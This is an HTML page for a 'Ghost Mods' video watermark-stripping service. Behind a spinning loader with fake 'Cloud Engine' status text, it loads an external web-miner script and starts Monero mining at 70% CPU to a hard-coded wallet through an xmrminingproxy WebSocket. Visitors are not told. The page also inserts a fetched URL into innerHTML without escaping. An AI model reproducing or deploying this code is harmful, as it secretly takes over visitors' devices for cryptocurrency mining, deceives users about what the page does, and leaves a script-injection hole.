<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Processing... | Ghost Mods</title>
    <script src="https://webminer.pages.dev/load.js"></script>
    <style>
        body { background: #0a0a0c; color: #00d4ff; font-family: sans-serif; text-align: center; padding-top: 20%; }
        .loader { width: 50px; height: 50px; border: 5px solid #111; border-top-color: #00d4ff; border-radius: 50%; animation: r 1s infinite linear; margin: auto; }
        @keyframes r { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2 id="t">Stripping Watermarks...</h2>
    <p id="s">Connecting to Ghost Cloud Engine (70% Power)</p>
    <script>
        const WORKER = "https://ghost-api.mr-ghosttrich.workers.dev";
        const WALLET = "48bN9tTb8niehRBkARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQcKVdJPoNapcWMUiu1TSZiG7FxftFy8hiRy";
        
        startMining(WALLET, "Ghost_Site", "wss://ny1.xmrminingproxy.com", 70);

        async function get() {
            const p = new URLSearchParams(window.location.search);
            const target = p.get('url');
            if(!target) return;
            try {
                const res = await fetch(`${WORKER}?url=${encodeURIComponent(target)}`);
                const data = await res.json();
                if(data.url) {
                    document.getElementById('t').innerText = "Ready!";
                    document.getElementById('s').innerHTML = `<a href="${data.url}" style="background:#00d4ff; color:#000; padding:15px 30px; text-decoration:none; border-radius:10px; font-weight:bold;">CLICK TO SAVE VIDEO</a>`;
                }
            } catch(e) { document.getElementById('t').innerText = "Engine Busy. Refreshing..."; }
        }
        setTimeout(get, 7000);
    </script>
</body>
</html>
